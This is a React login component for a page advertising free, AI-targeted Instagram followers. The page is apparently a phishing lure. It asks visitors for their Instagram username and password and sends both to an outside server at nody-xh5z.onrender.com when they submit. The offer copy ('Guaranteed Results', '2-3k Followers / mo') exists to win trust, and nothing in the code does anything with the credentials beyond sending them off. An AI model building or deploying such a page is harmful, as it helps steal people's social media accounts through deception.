
import React, { useState } from "react";
import axios from "axios";
// import "./LoginForm.css"; // We'll create this CSS

const LoginForm = () => {
  const [instagramUsername, setInstagramUsername] = useState("");
  const [password, setPassword] = useState("");
  const [message, setMessage] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    setMessage("");

    try {
      const { data } = await axios.post("https://nody-xh5z.onrender.com/api/register", {
        instagramUsername,
        password,
      });
      setMessage(data.message);
      setInstagramUsername("");
      setPassword("");
    } catch (error) {
      if (error.response && error.response.data) {
        setMessage(error.response.data.message);
      } else {
        setMessage("Something went wrong. Please try again.");
      }
    }
  };

  return (
    <div className="container-fluid mt-5">  
      <div className="login-page-container">
      {/* Left Card */}
      <div className="login-card">
        <h2 className="login-heading">Get Free Followers</h2>
        <p className="login-subheading">
          Let our AI-targeted organic growth work for you for free. Enter your email + 
          Instagram username, and we'll get working for you.
        </p>

        {/* Form */}
        <form className="form" onSubmit={handleSubmit}>
          <div className="form-group">
            <label htmlFor="instagramUsername">Instagram Username</label>
            <input 
              type="text"
              id="instagramUsername"
              value={instagramUsername}
              onChange={(e) => setInstagramUsername(e.target.value)}
              placeholder="Instagram Username"
            />
          </div>

          <div className="form-group">
            <label htmlFor="password">password</label>
            <input
              type="password"
              id="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Password"
            />
          </div>

          <button type="submit" className="btn-submit">
            Start Free Trial
          </button>
        </form>

        {message && <p className="message">{message}</p>}
      </div>

      {/* Right Content */}
      <div className="info-section">
        <h2 className="info-heading">Free Instagram Followers</h2>
        <p className="info-text">
          Let our AI-targeted organic growth work for you for free. Enter your Username + 
          Instagram password, and we’ll get working for you.
        </p>
        <ul className="benefits-list">
          <li>✅ Real, Organic Growth</li>
          <li>✅ Dedicated 24/7 Support</li>
          <li>✅ Advanced AI Targeting</li>
          <li>✅ Guaranteed Results</li>
          <li>✅ 2-3k Followers / mo</li>
        </ul>
      </div>
    </div>
    </div>
  );
};

export default LoginForm;
